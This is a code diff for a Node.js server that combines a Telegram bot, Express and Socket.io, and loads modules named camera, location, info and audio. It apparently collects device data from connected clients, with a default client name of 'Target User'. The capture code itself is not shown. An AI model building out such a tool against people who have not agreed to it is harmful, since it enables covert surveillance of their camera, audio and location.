@@ -17,9 +17,10 @@ if (!token || !adminId) {
     process.exit(1);
 }
 
+// Initialize Telegram Bot
 const bot = new TelegramBot(token, { polling: true });
 
-// Global Session Variables for Security & Approval
+// Global Session Variables for Security & Approval Modules
 global.bot = bot;
 global.adminId = adminId;
 global.io = io;
@@ -47,16 +48,17 @@ bot.setMyCommands([
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Load Feature Modules
-require('./modules/camera');
-require('./modules/location');
-require('./modules/info');
-require('./modules/audio');
+// Load Feature Modules from 'modules' folder
+require('./modules/camera')(app);
+require('./modules/location')(app);
+require('./modules/info')(app);
+require('./modules/audio')(app);
 
 // Socket.io Connection & Approval Handlers
 io.on('connection', (socket) => {
     console.log('Client connected:', socket.id);
 
+    // When client registers device after entering name
     socket.on('register_device', (data) => {
         global.pendingSocketId = socket.id;
         global.pendingUsername = data.name || "Target User";
